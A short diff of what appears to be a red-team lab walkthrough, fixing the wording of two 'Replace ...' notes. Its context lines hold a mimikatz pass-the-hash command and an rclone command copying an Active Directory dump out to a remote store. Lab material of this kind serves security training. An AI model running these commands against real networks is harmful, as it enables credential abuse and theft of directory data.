@@ -132,7 +132,7 @@ While still in `mimikatz` we can use that hash of the domain user (`ATTACKRANGE\
 
 **Step 10**
 > [!IMPORTANT]
-> Replace \<NTLM-hash\> with the real sting obtained from the previous step
+> Replace \<NTLM-hash\> with the actual sting obtained from the previous step
 
 ```PowerShell
 [ITSERVER:mimikatz] sekurlsa::pth /user:billh /ntlm:<NTLM-hash> /domain:attackrange /run:powershell
@@ -200,7 +200,7 @@ Now that SMB server is running and our `rclone` is ready, let's copy the AD dump
 
 **Step 15**
 > [!IMPORTANT]
-> Replace <NTLM-hash> with the real sting obtained from the previous step
+> Replace \<c.zip-filename\> with the actual name of the ZIP file created
 
 ```PowerShell
 [ITSERVER:PowerShell] C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Temp\<c.zip-filename> ss:data --no-check-dest
